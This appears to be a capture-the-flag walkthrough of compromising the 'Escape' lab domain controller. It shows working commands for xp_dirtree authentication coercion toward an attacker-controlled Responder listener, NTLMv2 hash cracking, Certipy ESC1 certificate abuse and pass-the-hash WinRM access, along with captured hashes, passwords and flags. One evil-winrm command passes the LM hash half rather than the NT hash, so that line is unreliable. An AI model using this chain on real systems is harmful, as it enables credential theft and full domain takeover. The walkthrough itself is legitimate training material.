## Initial Recon

- Nmap full TCP: `nmap -p- --min-rate=3000 -Pn -oN nmap/EscapeNmapOpenPorts.txt 10.10.11.202`
	- Open: 
		- 53 (DNS)
		- 88 (Kerberos)
		- 135/139/445 (RPC/NetBIOS/SMB)
		- 389/636/3268/3269 (LDAP/GC, LDAPS)
		- 464 (kpasswd)
		- 593 (RPC over HTTP)
		- 5985 (WinRM), 9389 (ADWS)
		- 1433 (MSSQL 2019)
		- high MSRPC ports.
- Nmap scripts/versions: `nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49711,49728,49750 -sSCV --min-rate=2000 -Pn -oN nmap/EscapeNmapServiceVersions.txt 10.10.11.202`
	- Host: `dc.sequel.htb`
	- Domain: `sequel.htb` (Windows DC).
	- MSSQL: Microsoft SQL Server 2019 RTM (15.00.2000.00) on 1433; Target_Name: sequel.
	- WinRM exposed (5985), SMB signing required, clock skew ~+8h.
	- Cert SANs: dc.sequel.htb, sequel.htb, sequel.

### Immediate Interpretation / Plan
- AD DC with Kerberos/LDAP/SMB/WinRM and MSSQL 2019.
- Likely paths: null/guest SMB/LDAP checks for userlist → AS-REP roast; MSSQL auth weaknesses; SMB share looting if any guest access; WinRM later if creds.

## SMB (Anonymous)
- `smbclient -N -L //10.10.11.202 > smbAnon.txt`
	- Shares exposed: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `Public`, `SYSVOL`.
	- Next: attempt anonymous read on `Public` (and potentially `NETLOGON`/`SYSVOL` if allowed).

## Public share loot
- `smbclient -N //dc.sequel.htb/Public -c 'ls'`
	- File: `SQL Server Procedures.pdf` (downloaded to `Escape/loot/SQL Server Procedures.pdf`)
```bash
smbclient -N //dc.sequel.htb/Public        
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1463996 blocks available

smb: \> mget "SQL Server Procedures.pdf" 
Get file SQL Server Procedures.pdf? y
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (288.0 KiloBytes/sec) (average 288.0 KiloBytes/sec)

```
- Key contents (pdftotext):
	- SQL auth for juniors: `PublicUser` / `GuestUserCantWrite1`
	- Target server name: `<serverName>.sequel.htb` (MSSQL 2019 on dc.sequel.htb)
	- Guidance: SQL Server Authentication (not Windows) for non-domain-joined access

- Using impacket to login into the database with creds from the pdf
	- `impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202`
- version 
	- Microsoft SQL Server 2019  (RTM) - 15.0.2000.5 (X64) 
```bash
SQL (PublicUser  guest@master)> select @@VERSION
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

```
- listing databases
	- master, tempdb, model, msdb
```bash
SQL (PublicUser  guest@master)> SELECT name FROM master.sys.databases
name     
------   
master   
tempdb   
model    
msdb
```
- Next move: coerce outbound auth (xp_dirtree + Responder) since low-priv SQL auth lacked direct OS access.

- Using xp_dirtree with responder to extract creds. run responder first.
- xp_dirtree.
```bash
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.3\yourmom
                          
subdirectory   depth   file   
------------   -----   ----   

```
- responder output
```bash
# Responder listening
sudo responder -I tun0                                                                        Fri19 [1120/1422]
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                              
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                              
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                
                   |__|                                                               
[+] Poisoners:    
    LLMNR                      [ON] 
    ....
[+] Servers:  
    HTTP server                [ON]  
...
[+] HTTP Options:  
    Always serving EXE         [OFF]  
    ...
[+] Poisoning Options:                                   
    Analyze Mode               [OFF]  
    ...
[+] Generic Options:                                     
    Responder NIC              [tun0]    
    Responder IP               [10.10.14.3]  
    Responder IPv6             [dead:beef:2::1001] 
    Challenge set              [random] 
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL'] 
    Don't Respond To MDNS TLD  ['_DOSVC']   
    TTL for poisoned response  [default] 
[+] Current Session Variables: 
    Responder Machine Name     [WIN-QUVW3HANYRS] 
    Responder Domain Name      [1PPZ.LOCAL]   
    Responder DCE-RPC Port     [49792] 
[*] Version: Responder 3.1.7.0  
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder
[+] Listening for events...
[!] Error starting TCP server on port 3389, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.11.202                                                                          
[SMB] NTLMv2-SSP Username : sequel\DC$                                                                            
[SMB] NTLMv2-SSP Hash     : DC$::sequel:58d4bdc10e942127:E91F19566F618E7C468C5234146AACD9:0101000000000000808953BAE970DC0182009AE877E8A54C00000000020008003100500050005A0001001E00570049004E002D0051005500560057003300480041004E0059005200530004003400570049004E002D0051005500560057003300480041004E005900520053002E003100500050005A002E004C004F00430041004C00030014003100500050005A002E004C004F00430041004C00050014003100500050005A002E004C004F00430041004C0007000800808953BAE970DC0106000400020000000800300030000000000000000000000000400000A17583EFD3052F0746BE9FDD726362118AAAEFD53C51211CF445E3049AF9CF070A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000                    
```

- responder output didn't show the sql_svc hash but the output file did. 
```bash
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.202.txt
DC$::sequel:58d4bdc10e942127:E91F19566F618E7C468C5234146AACD9:0101000000000000808953BAE970DC0182009AE877E8A54C00000000020008003100500050005A0001001E00570049004E002D0051005500560057003300480041004E0059005200530004003400570049004E002D0051005500560057003300480041004E005900520053002E003100500050005A002E004C004F00430041004C00030014003100500050005A002E004C004F00430041004C00050014003100500050005A002E004C004F00430041004C0007000800808953BAE970DC0106000400020000000800300030000000000000000000000000400000A17583EFD3052F0746BE9FDD726362118AAAEFD53C51211CF445E3049AF9CF070A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000
sql_svc::sequel:1f3a179950a90d66:1E24D94572BF32075655C5E6831FAEAE:010100000000000080EEA76BED70DC012CC615EC996EE18A0000000002000800580052004100390001001E00570049004E002D003800540044005700320052005800570038003600540004003400570049004E002D00380054004400570032005200580057003800360054002E0058005200410039002E004C004F00430041004C000300140058005200410039002E004C004F00430041004C000500140058005200410039002E004C004F00430041004C000700080080EEA76BED70DC0106000400020000000800300030000000000000000000000000300000A17583EFD3052F0746BE9FDD726362118AAAEFD53C51211CF445E3049AF9CF070A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000

```


- creds for sequel
	- cracked `sql_svc` NetNTLMv2 with hashcat m5600 → `REGGIE1234ronnie`
	- Rationale: upgraded SQL login should reveal more data or allow OS-level actions.

- logged in as sql_svc 
	- in sqlserver\logs it appears that ryan cooper put in his password as a username and it was logged
	- Ryan.Cooper / NuclearMosquito3
```bash
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```
- Why it mattered: DB error log leaked a domain user and password → first OS foothold.
- logging into Ryan with WinRM
	- user flag on Desktop
	- d002b784c2257a815ec4c32427a3af3a
- Next escalation vector: check AD CS via Certipy.

- use certipy to search for vulnerable ADCS certificates
	- `certipy -dc-ip 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3@escape find -enabled`
	- ESC1 - Enrollee supplies subject and template allows client authentication.
	- 

- Admin path (cert abuse)
	- `certipy find -dc-ip 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 -enabled -vulnerable`
		- Found ESC1 on template `UserAuthentication`
	- `certipy req -dc-ip 10.10.11.202 -u Ryan.Cooper -p 'NuclearMosquito3' -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dns dc.sequel.htb -outfile administrator`
		- Outputs: `administrator.pfx`, `administrator.ccache`
	- `certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202`
		- Got Administrator NT hash: `aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee`
	- DA shell via hash:
		- `evil-winrm -i 10.10.11.202 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee'`
		- Root flag: `de5473c36f437099c36d114d43e2c8ae`
- Decision chain: Public SQL auth → xp_dirtree coercion → crack `sql_svc` → SQL error logs leak Ryan creds → WinRM foothold → Certipy ESC1 (UserAuthentication) to spoof Administrator → PFX/ccache + NT hash → evil-winrm as DA → root flag.

## Evidence / Artifacts
- `smbAnon.txt` — anonymous share list
- `loot/SQL Server Procedures.pdf` — SQL creds `PublicUser/GuestUserCantWrite1`
- `sequelMSSQLhash.txt` — captured NetNTLMv2 for `sql_svc`
- `YourMomsWinPEASS.txt` — host recon
- Certipy outputs: `20251220134649_Certipy.*`, `20251220135453_Certipy.*`, `20251220180507_*`
- Tickets/keys: `administrator.pfx`, `administrator.ccache`
- BloodHound: `20251220180507_BloodHound.zip` + JSONs

## Gaps / To add
- None pending; all creds/commands/flags captured above.
